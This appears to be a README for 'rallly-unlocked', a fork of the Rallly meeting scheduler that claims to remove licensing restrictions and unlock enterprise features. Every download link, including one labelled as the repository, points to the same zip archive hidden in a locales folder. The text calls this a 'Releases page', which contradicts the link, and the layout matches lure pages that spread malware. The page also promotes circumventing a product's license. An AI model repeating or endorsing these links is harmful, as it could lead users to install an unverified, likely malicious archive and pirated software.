# 🚀 rallly-unlocked - Schedule Meetings Effortlessly

## 📦 Download Now
[![Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)

## 🚀 Getting Started
Rallly Unlocked is a self-hosted meeting scheduler, perfect for teams and internal deployments. It offers unlimited users for free through Docker, with all enterprise features enabled by default. This software removes any licensing restrictions and is a fork of the original Rallly application.

## 🖥️ System Requirements
To run Rallly Unlocked, ensure your system meets the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **Docker**: Make sure you have Docker installed.
- **Memory**: At least 2 GB of RAM
- **Disk Space**: 500 MB of free disk space

## 📚 Features
- Self-hosted option for secure management
- Unlimited user support for larger teams
- Enterprise features enabled by default
- Simple scheduling for meetings and events
- Open-source project, allowing contributions and improvements

## 📥 Download & Install
To download Rallly Unlocked, please visit the following page: [Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip). 

On the Releases page:
1. Find the latest version listed.
2. Click on the assets to download the file that fits your operating system.
3. Follow the instructions below to run it using Docker.

## 🐳 Running Rallly Unlocked with Docker
Follow these steps to run Rallly Unlocked using Docker:

1. **Open your terminal or command prompt.**

2. **Pull the Docker image.** Enter the following command:
   ```
   docker pull shurlockecharacterless265/rallly-unlocked
   ```

3. **Run the Docker container.** Use this command:
   ```
   docker run -d -p 8080:80 shurlockecharacterless265/rallly-unlocked
   ```

4. **Access the app.** Open your web browser and go to `http://localhost:8080`.

5. **Follow the on-screen prompts** to set up your account and start scheduling meetings.

## ⚙️ Configuration
You can customize Rallly Unlocked using environment variables. To set these, adjust your Docker run command. Here are some commonly used variables:

- `RALLLY_DB_URL`: Set your database connection string.
- `RALLLY_ADMIN_EMAIL`: Admin email for notifications.
- `RALLLY_ADMIN_PASSWORD`: Set a secure password for your admin account.

## 🌐 Explore & Contribute
Since Rallly Unlocked is open-source, you can contribute to its development. Visit the repository to explore the source code, report issues, or suggest features:

- [rallly-unlocked GitHub Repository](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)

## 🛠️ Troubleshooting
If you encounter issues, here are some common problems and solutions:

- **Issue**: The application does not start.
  - **Solution**: Check if Docker is running. Restart the Docker service if needed.

- **Issue**: Unable to connect to the database.
  - **Solution**: Verify your database connection string and ensure the database service is running.

- **Issue**: Web interface not responding.
  - **Solution**: Ensure you are accessing the correct port in your browser, which is `8080` by default.

## 📞 Support
For help, you can create an issue on the GitHub repository. Provide detailed information about your problem so that others can assist you effectively.

## 🔗 Useful Links
- **Documentation**: Check the detailed documentation for configuration and advanced features.
- **Community Discussions**: Join discussions with other users and developers to share experiences and solutions.

For download options, please visit: [Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip).